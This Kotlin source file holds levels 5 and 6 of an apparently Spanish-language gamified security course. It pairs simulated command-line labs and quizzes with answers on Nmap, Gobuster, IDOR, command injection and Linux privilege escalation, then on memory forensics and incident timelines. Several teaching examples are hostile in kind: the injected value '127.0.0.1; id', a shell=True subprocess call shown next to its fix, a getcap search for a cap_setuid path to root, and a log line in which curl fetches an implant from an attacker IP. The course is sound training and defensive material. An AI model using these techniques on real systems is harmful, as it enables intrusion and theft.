package com.example.data.curriculum

import com.example.data.model.CliLabScenario
import com.example.data.model.CurriculumLevel
import com.example.data.model.CurriculumTopic
import com.example.data.model.QuizQuestion
import com.example.data.model.TheorySection

object CurriculumLevels5To6 {

    val level5Cazador = CurriculumLevel(
        number = 5,
        rankName = "Cazador",
        title = "Nivel 5: Cazador",
        subtitle = "Hacking Ético, Nmap, Pentesting Web y Escalada",
        badgeCode = "NIVEL 5",
        description = "Ponte en la piel del Red Team: aprende a realizar pruebas de penetración éticas con Nmap, descubrir rutas ocultas con Gobuster y auditar fallos web.",
        syllabusHighlights = listOf(
            "Escaneo profesional de puertos y versiones con Nmap",
            "Descubrimiento de directorios y archivos secretos en webs (Gobuster)",
            "Vulnerabilidades Web OWASP: Inyección SQL e IDOR",
            "Inyección de Comandos en el servidor y cómo prevenirla",
            "Escalada de Privilegios en Linux para llegar a root"
        ),
        topics = listOf(
            CurriculumTopic(
                id = "l5_t1",
                levelNumber = 5,
                orderIndex = 1,
                code = "CLASE 5.1",
                title = "Escaneo con Nmap",
                durationMinutes = 8,
                xpReward = 215,
                summary = "Domina la herramienta número uno del Hacking Ético: Nmap, para descubrir qué servicios y versiones exactas corren en un objetivo.",
                subtopicsChecklist = listOf(
                    "Las fases de un Pentest profesional",
                    "Qué hacen los parámetros -sV (versiones) y -sC (scripts seguros) en Nmap",
                    "Escanear el servidor objetivo 10.10.50.25"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "El Escáner Rey del Pentesting: Nmap",
                        body = "Cuando un pentester inicia una auditoría autorizada, su primera herramienta es **Nmap**.\n\nAl ejecutar `nmap -sV -sC`, Nmap no solo te dice qué puertos están abiertos, sino también qué programa exacto y qué versión está corriendo detrás de cada puerta.",
                        codeSnippet = "$ nmap -sV -sC 10.10.50.25\n21/tcp   open  ftp   vsftpd 3.0.5 (Anonymous login allowed)\n8080/tcp open  http  nginx 1.24.0",
                        keyTakeaway = "Saber la versión exacta de un servicio permite investigar si tiene vulnerabilidades conocidas."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Escanea el Objetivo con Nmap",
                    briefing = "Lanza un escaneo de versiones y scripts contra el host `10.10.50.25` ejecutando `nmap -sV -sC 10.10.50.25`.",
                    initialBanner = listOf(
                        "RED TEAM RECON — NMAP",
                        "Objetivo autorizado: 10.10.50.25"
                    ),
                    quickChips = listOf("nmap -sV -sC 10.10.50.25", "ping -c 2 10.10.50.25"),
                    hint = "Toca el chip 'nmap -sV -sC 10.10.50.25' y presiona Ejecutar.",
                    acceptedCommands = listOf("nmap -sv -sc 10.10.50.25", "nmap -sc -sv 10.10.50.25", "nmap 10.10.50.25"),
                    requiredTokens = listOf("nmap", "10.10.50.25"),
                    successOutput = listOf(
                        "PORT     STATE SERVICE VERSION",
                        "21/tcp   open  ftp     vsftpd 3.0.5 (Anonymous FTP login allowed)",
                        "8080/tcp open  http    nginx 1.24.0 (Hackklin Staging)",
                        "[+] ¡Descubierto! FTP anónimo abierto y servidor web en el puerto 8080."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l5_t1_1",
                        question = "¿Para qué sirve el parámetro `-sV` al realizar un escaneo con Nmap?",
                        options = listOf(
                            "Para detectar el nombre y la versión exacta de los servicios que escuchan en cada puerto abierto",
                            "Para apagar el equipo remoto",
                            "Para borrar la pantalla",
                            "Para cambiar tu dirección IP"
                        ),
                        correctIndex = 0,
                        explanation = "El flag -sV (Service Version) interroga cada puerto abierto para identificar el software y su versión."
                    )
                )
            ),
            CurriculumTopic(
                id = "l5_t2",
                levelNumber = 5,
                orderIndex = 2,
                code = "CLASE 5.2",
                title = "Rutas Web Ocultas",
                durationMinutes = 7,
                xpReward = 220,
                summary = "Usa Gobuster para encontrar paneles de administración y archivos de respaldo olvidados dentro de un servidor web.",
                subtopicsChecklist = listOf(
                    "Por qué ocultar un enlace no lo hace seguro",
                    "Fuzzing de directorios web con Gobuster",
                    "El peligro de dejar archivos .bak o .env en la web"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Encontrando Puertas Secretas en la Web con Gobuster",
                        body = "Muchos programadores creen que si no ponen un botón hacia `/console-admin` o `/.env.backup`, nadie lo encontrará.\n\nLa herramienta **Gobuster** prueba miles de nombres de carpetas por segundo y nos avisa cuáles responden con código `200 OK`.",
                        codeSnippet = "$ gobuster dir -u http://10.10.50.25:8080 -w common.txt\n/console-admin  (Status: 200)\n/.env.backup    (Status: 200)  ◄── ¡Credenciales expuestas!",
                        keyTakeaway = "Los archivos de copia de seguridad (.bak, .old, .env) jamás deben guardarse en la carpeta pública de una web."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Descubre Archivos Ocultos con Gobuster",
                    briefing = "Ejecuta `gobuster dir -u http://10.10.50.25:8080 -w common.txt` para buscar carpetas ocultas.",
                    initialBanner = listOf(
                        "ENUMERADOR WEB GOBUSTER",
                        "URL objetivo: http://10.10.50.25:8080"
                    ),
                    quickChips = listOf("gobuster dir -u http://10.10.50.25:8080 -w common.txt", "help"),
                    hint = "Toca el chip de gobuster y presiona Ejecutar.",
                    acceptedCommands = listOf("gobuster dir -u http://10.10.50.25:8080 -w common.txt"),
                    requiredTokens = listOf("10.10.50.25:8080"),
                    successOutput = listOf(
                        "/assets          (Status: 301)",
                        "/console-admin   (Status: 200) [Size: 4192]",
                        "/.env.backup     (Status: 200) [Size: 384]",
                        "[+] ¡Encontraste el panel '/console-admin' y el respaldo '/.env.backup'!"
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l5_t2_1",
                        question = "¿Qué significa que Gobuster reporte `Status: 200` al probar la ruta `/.env.backup`?",
                        options = listOf(
                            "Que el archivo existe y el servidor lo está entregando públicamente a cualquiera que lo pida",
                            "Que el archivo fue eliminado",
                            "Que el servidor está apagado",
                            "Que se requiere contraseña de administrador"
                        ),
                        correctIndex = 0,
                        explanation = "El código HTTP 200 OK indica que la petición tuvo éxito y el contenido fue devuelto."
                    )
                )
            ),
            CurriculumTopic(
                id = "l5_t3",
                levelNumber = 5,
                orderIndex = 3,
                code = "CLASE 5.3",
                title = "Fallos OWASP e IDOR",
                durationMinutes = 8,
                xpReward = 230,
                summary = "Comprende los dos fallos web más famosos del mundo (Inyección SQL y Control de Acceso Roto IDOR) y cómo probarlos.",
                subtopicsChecklist = listOf(
                    "¿Qué es un fallo IDOR? Ver datos de otro usuario cambiando un número en la URL",
                    "¿Qué es la Inyección SQL y cómo se corrige con Consultas Parametrizadas?",
                    "Prueba práctica de IDOR con curl"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "El Fallo Más Común en APIs: IDOR",
                        body = "Imagina que entras a ver tu factura en `/api/v1/facturas?id=101`. ¿Qué pasa si cambias el `101` por `100`?\n\nSi el servidor te muestra la factura de otra persona sin comprobar que sea tuya, tiene una vulnerabilidad **IDOR** (Referencia Directa a Objetos Insegura).",
                        codeSnippet = "Petición normal:  /api/v1/facturas?id=101 (Tu usuario)\nPrueba de IDOR:   /api/v1/facturas?id=100 (Cuenta del Administrador)",
                        keyTakeaway = "El servidor debe verificar siempre en cada petición si el usuario conectado tiene permiso sobre ese ID."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Comprueba el Fallo IDOR en la API",
                    briefing = "Solicita el registro `id=100` ejecutando `curl -s http://10.10.50.25:8080/api/v1/facturas?id=100`.",
                    initialBanner = listOf(
                        "AUDITORÍA OWASP API",
                        "Tu ID actual es 101. Prueba si puedes leer el ID 100."
                    ),
                    quickChips = listOf("curl -s http://10.10.50.25:8080/api/v1/facturas?id=100", "help"),
                    hint = "Toca el chip con el comando curl y presiona Ejecutar.",
                    acceptedCommands = listOf(
                        "curl -s http://10.10.50.25:8080/api/v1/facturas?id=100",
                        "curl http://10.10.50.25:8080/api/v1/facturas?id=100"
                    ),
                    requiredTokens = listOf("curl", "id=100"),
                    successOutput = listOf(
                        "{\"id\": 100, \"propietario\": \"admin_finanzas\", \"api_token\": \"HK-IDOR-8821\"}",
                        "[!] ¡Vulnerabilidad IDOR confirmada! El servidor entregó datos del administrador."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l5_t3_1",
                        question = "¿Cómo se llama la vulnerabilidad donde un usuario puede ver datos privados de otra persona simplemente cambiando el número de `id` en la dirección web?",
                        options = listOf("IDOR (Insecure Direct Object Reference)", "Fuerza bruta Wi-Fi", "Antivirus", "Cortafuegos"),
                        correctIndex = 0,
                        explanation = "IDOR ocurre cuando la aplicación expone un identificador directo y olvida validar si el usuario actual es su propietario."
                    )
                )
            ),
            CurriculumTopic(
                id = "l5_t4",
                levelNumber = 5,
                orderIndex = 4,
                code = "CLASE 5.4",
                title = "Inyección de Comandos",
                durationMinutes = 7,
                xpReward = 225,
                summary = "Aprende cómo ocurre una Inyección de Comandos cuando una página web conecta datos del usuario directamente a la consola del servidor.",
                subtopicsChecklist = listOf(
                    "El peligro de usar shell=True con textos enviados por el usuario",
                    "Cómo el punto y coma (;) encadena un segundo comando oculto",
                    "Auditar código vulnerable en Python"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Cuando una Web Ejecuta Comandos a Ciegas",
                        body = "Si una aplicación web pega lo que escribe el usuario directamente dentro de un comando de sistema (usando `shell=True`), un atacante puede escribir `127.0.0.1; id`.\n\nEl signo `;` le dice al servidor: termina el ping y ejecuta inmediatamente el segundo comando.",
                        codeSnippet = "# Peligroso:\nsubprocess.check_output(f\"ping -c 1 {target}\", shell=True)\n\n# Seguro:\nsubprocess.run([\"/bin/ping\", \"-c\", \"1\", target], shell=False)",
                        keyTakeaway = "Nunca uses shell=True con entradas de usuario; pasa los argumentos como una lista separada."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Encuentra el Fallo en el Código Fuente",
                    briefing = "Inspecciona el archivo `diagnostico_api.py` ejecutando `cat diagnostico_api.py` para ver la línea vulnerable.",
                    initialBanner = listOf(
                        "AUDITORÍA DE CÓDIGO SEGURO",
                        "Archivo: diagnostico_api.py"
                    ),
                    quickChips = listOf("cat diagnostico_api.py", "grep -n shell diagnostico_api.py"),
                    hint = "Toca el chip 'cat diagnostico_api.py' y presiona Ejecutar.",
                    acceptedCommands = listOf("cat diagnostico_api.py", "grep -n shell diagnostico_api.py"),
                    requiredTokens = listOf("diagnostico_api.py"),
                    successOutput = listOf(
                        "13: target = request.GET.get('host')",
                        "15: output = subprocess.check_output(f\"ping -c 1 {target}\", shell=True)",
                        "[+] ¡Fallo localizado en la línea 15 por usar shell=True!"
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l5_t4_1",
                        question = "¿Por qué es peligroso activar `shell=True` al ejecutar comandos del sistema con datos que provienen de un usuario?",
                        options = listOf(
                            "Porque permite que el usuario inyecte caracteres como ';' o '&&' para ejecutar comandos arbitrarios en el servidor",
                            "Porque cambia el idioma del sistema",
                            "Porque hace más pequeño el texto",
                            "Porque apaga el ratón"
                        ),
                        correctIndex = 0,
                        explanation = "Con shell=True se invoca un intérprete de consola que procesa metacaracteres de encadenamiento de comandos."
                    )
                )
            ),
            CurriculumTopic(
                id = "l5_t5",
                levelNumber = 5,
                orderIndex = 5,
                code = "CLASE 5.5",
                title = "Escalada a Root",
                durationMinutes = 8,
                xpReward = 240,
                summary = "Descubre cómo los auditores buscan capacidades especiales en Linux (getcap) para elevar privilegios hasta administrador root.",
                subtopicsChecklist = listOf(
                    "¿Qué es la Escalada de Privilegios?",
                    "Capacidades ocultas de Linux (Capabilities) con getcap",
                    "Graduación del Nivel 5: Cazador"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "El Camino hacia Root: Linux Capabilities",
                        body = "En un pentest, entrar al servidor como un usuario básico es solo la mitad del camino; el objetivo final es comprobar si se puede escalar a `root`.\n\nCon el comando `getcap -r / 2>/dev/null` buscamos si algún programa como `python3` tiene el permiso especial `cap_setuid`, que permite convertirse en superusuario al instante.",
                        codeSnippet = "$ getcap -r / 2>/dev/null\n/usr/bin/python3.11 cap_setuid=ep  ◄── ¡Puerta hacia root!",
                        keyTakeaway = "¡Completa este laboratorio para graduarte de Cazador y desbloquear el Nivel 6: Especialista Forense (DFIR)!"
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Busca Capacidades Especiales en el Sistema",
                    briefing = "Ejecuta `getcap -r / 2>/dev/null` para descubrir qué programa tiene asignado `cap_setuid`.",
                    initialBanner = listOf(
                        "ESCALADA DE PRIVILEGIOS LINUX",
                        "Usuario actual: www-data -> Meta: Detectar vía hacia root"
                    ),
                    quickChips = listOf("getcap -r / 2>/dev/null", "id"),
                    hint = "Toca el chip 'getcap -r / 2>/dev/null' y pulsa Ejecutar.",
                    acceptedCommands = listOf("getcap -r / 2>/dev/null", "getcap -r /"),
                    requiredTokens = listOf("getcap"),
                    successOutput = listOf(
                        "/usr/bin/ping cap_net_raw=ep",
                        "/usr/bin/python3.11 cap_setuid=ep",
                        "[!] ¡Vector de escalada encontrado en python3.11! Nivel 5 completado."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l5_t5_1",
                        question = "¿Qué comando utilizamos en Linux para buscar programas que tengan asignadas 'Capabilities' especiales del sistema?",
                        options = listOf("getcap -r / 2>/dev/null", "ping", "clear", "mkdir"),
                        correctIndex = 0,
                        explanation = "getcap -r / inspecciona recursivamente todos los archivos en busca de capacidades POSIX."
                    )
                )
            )
        )
    )

    val level6Especialista = CurriculumLevel(
        number = 6,
        rankName = "Especialista",
        title = "Nivel 6: Especialista",
        subtitle = "Forense Digital y Respuesta a Incidentes (DFIR)",
        badgeCode = "NIVEL 6",
        description = "Investiga ciberataques como un detective forense: preserva la evidencia en memoria RAM, analiza procesos con Volatility y reconstruye la línea de tiempo.",
        syllabusHighlights = listOf(
            "Orden de Volatilidad: Por qué capturar la memoria RAM antes de apagar",
            "Análisis Forense de Memoria RAM con Volatility 3",
            "Detección de fechas falsificadas (Timestomping) en archivos",
            "Extracción de pistas ocultas dentro de un binario con strings",
            "Reconstrucción de la Línea de Tiempo del Incidente"
        ),
        topics = listOf(
            CurriculumTopic(
                id = "l6_t1",
                levelNumber = 6,
                orderIndex = 1,
                code = "CLASE 6.1",
                title = "Evidencia Forense",
                durationMinutes = 7,
                xpReward = 245,
                summary = "Aprende la primera regla del forense digital: capturar primero lo más volátil (la memoria RAM) y sellar las pruebas con SHA-256.",
                subtopicsChecklist = listOf(
                    "Por qué NUNCA debes desenchufar de golpe un servidor atacado",
                    "El Orden de Volatilidad: RAM primero, Disco después",
                    "Sellar la Cadena de Custodia con sha256sum"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "No Desenchufes el Servidor: El Orden de Volatilidad",
                        body = "Cuando ocurre un ataque, el instinto de muchos es apagar el servidor. ¡Error! Los virus modernos viven en la **Memoria RAM** y desaparecen al cortar la corriente.\n\nEl investigador forense captura primero la RAM y luego clona el disco sellándolo con un hash SHA-256 (Cadena de Custodia).",
                        codeSnippet = "1º Memoria RAM y Conexiones Activas (Se borran al apagar)\n2º Disco Duro / SSD (Clonado exacto con sello SHA-256)",
                        keyTakeaway = "La Cadena de Custodia demuestra matemáticamente que la evidencia no fue alterada durante la investigación."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Sella la Imagen Forense del Disco",
                    briefing = "Calcula el sello criptográfico de la evidencia `evidencia_particion.dd` ejecutando `sha256sum evidencia_particion.dd`.",
                    initialBanner = listOf(
                        "LABORATORIO FORENSE DFIR",
                        "Evidencia recolectada: evidencia_particion.dd"
                    ),
                    quickChips = listOf("sha256sum evidencia_particion.dd", "ls -lh"),
                    hint = "Toca el chip 'sha256sum evidencia_particion.dd' y pulsa Ejecutar.",
                    acceptedCommands = listOf("sha256sum evidencia_particion.dd", "file evidencia_particion.dd"),
                    requiredTokens = listOf("evidencia_particion.dd"),
                    successOutput = listOf(
                        "8f4e2c19a7b6d5039182736455aa99bbccddeeff00112233  evidencia_particion.dd",
                        "[+] ¡Sello de Cadena de Custodia registrado con éxito!"
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l6_t1_1",
                        question = "¿Por qué no se debe apagar de inmediato un servidor bajo ataque antes de tomar una captura forense?",
                        options = listOf(
                            "Porque al cortar la energía se borra toda la memoria RAM, perdiendo procesos ocultos y conexiones activas del atacante",
                            "Porque el botón de apagado gasta electricidad",
                            "Porque se rompe el monitor",
                            "Porque cambia el color del gabinete"
                        ),
                        correctIndex = 0,
                        explanation = "La memoria RAM es volátil y contiene evidencia crucial que desaparece al apagar el equipo."
                    )
                )
            ),
            CurriculumTopic(
                id = "l6_t2",
                levelNumber = 6,
                orderIndex = 2,
                code = "CLASE 6.2",
                title = "Forense RAM Volatility",
                durationMinutes = 8,
                xpReward = 255,
                summary = "Usa Volatility 3 para analizar una captura de memoria RAM y descubrir a qué dirección IP externa estaba conectado un virus.",
                subtopicsChecklist = listOf(
                    "¿Qué es Volatility 3?",
                    "Rastrear conexiones del atacante en la RAM con windows.netscan",
                    "Identificar el proceso impostor svchost.exe"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Investigando la Memoria RAM con Volatility 3",
                        body = "Una vez guardada la copia de la memoria RAM en un archivo `.raw`, usamos **Volatility 3** para ver qué ocurría en ese instante exacto.\n\nCon el comando `windows.netscan` podemos ver todas las conexiones de red abiertas y qué proceso las estaba usando.",
                        codeSnippet = "$ vol -f incidente_ram.raw windows.netscan\nTCPv4  10.10.15.20:49811 -> 198.51.100.240:4444  ESTABLISHED  svchost.exe",
                        keyTakeaway = "El puerto 4444 es famoso por ser el puerto por defecto de herramientas de control remoto como Metasploit."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Descubre la Conexión del Virus en la RAM",
                    briefing = "Analiza el volcado `incidente_ram.raw` ejecutando `vol -f incidente_ram.raw windows.netscan`.",
                    initialBanner = listOf(
                        "VOLATILITY 3 — FORENSE DE MEMORIA",
                        "Volcado RAM: incidente_ram.raw"
                    ),
                    quickChips = listOf("vol -f incidente_ram.raw windows.netscan", "vol -f incidente_ram.raw windows.pstree"),
                    hint = "Toca el chip 'vol -f incidente_ram.raw windows.netscan' y pulsa Ejecutar.",
                    acceptedCommands = listOf("vol -f incidente_ram.raw windows.netscan", "vol -f incidente_ram.raw windows.pstree"),
                    requiredTokens = listOf("vol", "incidente_ram.raw"),
                    successOutput = listOf(
                        "Proto  LocalAddr          ForeignAddr          State        PID   Owner",
                        "TCPv4  10.10.15.20:49811  198.51.100.240:4444  ESTABLISHED  4812  svchost.exe",
                        "[!] ¡Conexión maliciosa detectada hacia 198.51.100.240:4444!"
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l6_t2_1",
                        question = "¿Qué comando de Volatility 3 permite listar todas las conexiones de red que estaban activas en la memoria RAM de un equipo Windows?",
                        options = listOf("windows.netscan", "mkdir", "chmod", "clear"),
                        correctIndex = 0,
                        explanation = "El plugin windows.netscan reconstruye los sockets y conexiones TCP/UDP presentes en la memoria RAM."
                    )
                )
            ),
            CurriculumTopic(
                id = "l6_t3",
                levelNumber = 6,
                orderIndex = 3,
                code = "CLASE 6.3",
                title = "Fechas Falsificadas",
                durationMinutes = 7,
                xpReward = 250,
                summary = "Aprende a desenmascarar archivos maliciosos cuando el atacante les cambia la fecha a 2021 para que parezcan antiguos (Timestomping).",
                subtopicsChecklist = listOf(
                    "¿Qué es el Timestomping (falsificación de fechas)?",
                    "Diferencia entre fecha Modify (contenido) y Change (inodo del sistema)",
                    "Inspección forense con el comando stat"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Cazando Mentiras en las Fechas con stat",
                        body = "Para esconder su virus, muchos atacantes le cambian la fecha de modificación (`Modify`) al año 2021 para que parezca un archivo viejo del sistema.\n\nPero el reloj interno del sistema de archivos (`Change`) no se deja engañar y guarda el segundo exacto en que el archivo fue puesto ahí. Lo vemos con el comando `stat`.",
                        codeSnippet = "$ stat dbus-helper.service\nModify: 2021-05-14  ◄── Fecha falsa puesta por el atacante\nChange: 2026-11-09  ◄── ¡Fecha real de hoy!",
                        keyTakeaway = "Cuando Modify es de hace años pero Change es de hoy, acabas de descubrir un archivo manipulado."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Desenmascara la Fecha Falsificada",
                    briefing = "Revisa las fechas reales del archivo sospechoso ejecutando `stat dbus-helper.service`.",
                    initialBanner = listOf(
                        "DETECTOR DE TIMESTOMPING",
                        "Archivo sospechoso: dbus-helper.service"
                    ),
                    quickChips = listOf("stat dbus-helper.service", "cat dbus-helper.service"),
                    hint = "Toca el chip 'stat dbus-helper.service' y pulsa Ejecutar.",
                    acceptedCommands = listOf("stat dbus-helper.service", "cat dbus-helper.service"),
                    requiredTokens = listOf("dbus-helper.service"),
                    successOutput = listOf(
                        "Modify: 2021-05-14 12:00:00 +0000",
                        "Change: 2026-11-09 04:19:52 +0000",
                        "[!] ¡Timestomping descubierto! El archivo fue plantado hoy a las 04:19."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l6_t3_1",
                        question = "¿Cómo se llama la técnica donde un atacante altera la fecha de un archivo malicioso para que parezca un archivo viejo del sistema?",
                        options = listOf("Timestomping", "Phishing", "Firewalling", "Hashing"),
                        correctIndex = 0,
                        explanation = "El Timestomping modifica las marcas de tiempo estándar para intentar pasar desapercibido en revisiones superficiales."
                    )
                )
            ),
            CurriculumTopic(
                id = "l6_t4",
                levelNumber = 6,
                orderIndex = 4,
                code = "CLASE 6.4",
                title = "Destripando Malware",
                durationMinutes = 7,
                xpReward = 250,
                summary = "Extrae las direcciones secretas escondidas dentro de un virus sin necesidad de ejecutarlo usando el comando strings.",
                subtopicsChecklist = listOf(
                    "Análisis Estático: Investigar un virus sin abrirlo",
                    "Extraer textos legibles dentro de un binario con strings",
                    "Descubrir a qué servidor manda los datos robados"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Leyendo el Interior de un Virus con strings",
                        body = "Nunca debes hacer doble clic en un archivo sospechoso. En su lugar, usamos el comando `strings`.\n\n`strings` escanea el interior del archivo binario y extrae cualquier palabra, dirección web o ruta oculta que el creador del malware haya dejado adentro.",
                        codeSnippet = "$ strings implant_sample.bin\nC2_ENDPOINT=https://198.51.100.240:8443/api/v2/checkin\nPERSIST_PATH=/etc/cron.d/sys-health-check",
                        keyTakeaway = "Con un solo comando strings podemos obtener la dirección del servidor del atacante y bloquearla en toda la empresa."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Extrae las Pistas Ocultas del Binario",
                    briefing = "Extrae los textos ocultos dentro del virus `implant_sample.bin` ejecutando `strings implant_sample.bin`.",
                    initialBanner = listOf(
                        "LABORATORIO DE ANÁLISIS DE MALWARE",
                        "Muestra en cuarentena: implant_sample.bin"
                    ),
                    quickChips = listOf("strings implant_sample.bin", "file implant_sample.bin"),
                    hint = "Toca el chip 'strings implant_sample.bin' y presiona Ejecutar.",
                    acceptedCommands = listOf("strings implant_sample.bin", "strings -a implant_sample.bin"),
                    requiredTokens = listOf("strings", "implant_sample.bin"),
                    successOutput = listOf(
                        "MUTEX_ID=HK_SHADOW_LOCK_99",
                        "C2_ENDPOINT=https://198.51.100.240:8443/api/v2/checkin",
                        "PERSIST_PATH=/etc/cron.d/sys-health-check",
                        "[+] ¡Servidor del atacante y ruta de persistencia extraídos con éxito!"
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l6_t4_1",
                        question = "¿Qué comando permite extraer todas las cadenas de texto legibles (como URLs o direcciones IP) escondidas dentro de un programa ejecutable sin correrlo?",
                        options = listOf("strings", "reboot", "rm", "cd"),
                        correctIndex = 0,
                        explanation = "El comando strings busca secuencias de caracteres imprimibles dentro de cualquier archivo binario."
                    )
                )
            ),
            CurriculumTopic(
                id = "l6_t5",
                levelNumber = 6,
                orderIndex = 5,
                code = "CLASE 6.5",
                title = "Línea de Tiempo",
                durationMinutes = 8,
                xpReward = 260,
                summary = "Reconstruye minuto a minuto cómo entró el atacante y cómo erradicarlo de raíz para graduarte del Nivel 6.",
                subtopicsChecklist = listOf(
                    "Encontrar el 'Paciente Cero' (el primer punto por donde entró el atacante)",
                    "Por qué todas las horas forenses se unifican en horario UTC",
                    "Inspección de la línea de tiempo del incidente"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Reconstruyendo la Historia del Ataque",
                        body = "Para expulsar a un atacante para siempre, no basta con borrar el virus: debemos saber por qué ventana entró (la Causa Raíz).\n\nUniendo los registros en una **Línea de Tiempo** en horario universal UTC, podemos ver el segundo exacto en que subió el archivo malicioso y cerrar ese hueco.",
                        codeSnippet = "02:10:04 UTC ──► Suben archivo malicioso en /upload.php\n02:11:19 UTC ──► El archivo descarga el implante\n02:14:50 UTC ──► Se esconde en las tareas programadas (cron)",
                        keyTakeaway = "¡Supera este laboratorio para graduarte de Especialista DFIR y desbloquear el Nivel 7: Arquitecto Cloud!"
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Descubre cómo Entró el Atacante",
                    briefing = "Lee la línea de tiempo consolidada ejecutando `cat super_timeline.csv`.",
                    initialBanner = listOf(
                        "RECONSTRUCTOR DE INCIDENTES DFIR",
                        "Archivo: super_timeline.csv"
                    ),
                    quickChips = listOf("cat super_timeline.csv", "head super_timeline.csv"),
                    hint = "Toca el chip 'cat super_timeline.csv' y presiona Ejecutar.",
                    acceptedCommands = listOf("cat super_timeline.csv", "head super_timeline.csv"),
                    requiredTokens = listOf("super_timeline.csv"),
                    successOutput = listOf(
                        "02:10:04Z | WAF_LOG | POST /upload.php file=avatar_cache.php (200 OK)",
                        "02:11:19Z | SYSMON  | Process www-data -> curl 198.51.100.240/implant",
                        "[+] ¡Causa raíz confirmada en /upload.php! Nivel 6 completado."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l6_t5_1",
                        question = "¿Por qué es indispensable encontrar y cerrar el punto de entrada inicial ('Causa Raíz') antes de dar por terminado un incidente?",
                        options = listOf(
                            "Porque si solo borramos el virus pero dejamos abierta la vulnerabilidad por donde entró, el atacante volverá a infectar el servidor en minutos",
                            "Para gastar más espacio en disco",
                            "Porque lo exige el salvapantallas",
                            "No hace falta cerrarlo"
                        ),
                        correctIndex = 0,
                        explanation = "Erradicar sin corregir la vulnerabilidad de entrada permite la reinfección inmediata del sistema."
                    )
                )
            )
        )
    )
}
